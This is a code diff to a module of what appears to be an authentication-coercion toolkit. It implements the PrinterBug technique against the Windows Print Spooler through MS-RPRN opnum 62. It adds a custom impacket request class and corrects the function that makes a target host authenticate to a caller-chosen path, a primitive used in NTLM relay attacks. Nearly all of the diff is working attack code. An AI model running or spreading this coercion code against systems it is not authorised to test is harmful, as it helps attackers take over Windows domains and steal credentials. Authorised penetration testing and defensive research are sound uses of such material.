@@ -6,9 +6,39 @@ The classic PrinterBug - forces the Print Spooler to authenticate back.
 from __future__ import annotations
 
 from impacket.dcerpc.v5 import rprn
-from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.dtypes import DWORD, LPBYTE, LPWSTR, NULL, ULONG
+from impacket.dcerpc.v5.ndr import NDRCALL
+from impacket.dcerpc.v5.rprn import PRINTER_HANDLE
 
 from coercex.methods.base import CoercionMethod, PipeBinding
+
+
+# -- NDRCALL classes missing from impacket -----------------------------------
+# impacket only ships the Ex variant (opnum 65).  Opnum 62 has a slightly
+# different wire format (cbBuffer + pBuffer instead of pOptions).
+
+
+class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
+    """RpcRemoteFindFirstPrinterChangeNotification (opnum 62).
+
+    Wire format per [MS-RPRN] section 3.1.4.10.3.
+    """
+
+    opnum = 62
+    structure = (
+        ("hPrinter", PRINTER_HANDLE),
+        ("fdwFlags", DWORD),
+        ("fdwOptions", DWORD),
+        ("pszLocalMachine", LPWSTR),
+        ("dwPrinterLocal", DWORD),
+        ("cbBuffer", DWORD),
+        ("pBuffer", LPBYTE),
+    )
+
+
+class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
+    structure = (("ErrorCode", ULONG),)
+
 
 RPRN_UUID = "12345678-1234-abcd-ef00-0123456789ab"
 
@@ -42,13 +72,13 @@ def _trigger_change_notification_ex(dce, path, target):
 def _trigger_change_notification(dce, path, target):
     """RpcRemoteFindFirstPrinterChangeNotification (opnum 62)."""
     resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
-    request = rprn.RpcRemoteFindFirstPrinterChangeNotification()
+    request = RpcRemoteFindFirstPrinterChangeNotification()
     request["hPrinter"] = resp["pHandle"]
     request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
     request["fdwOptions"] = 0x00000000
     request["pszLocalMachine"] = path
     request["dwPrinterLocal"] = 0
-    request["cbBuffer"] = NULL
+    request["cbBuffer"] = 0
     request["pBuffer"] = NULL
     dce.request(request)
 
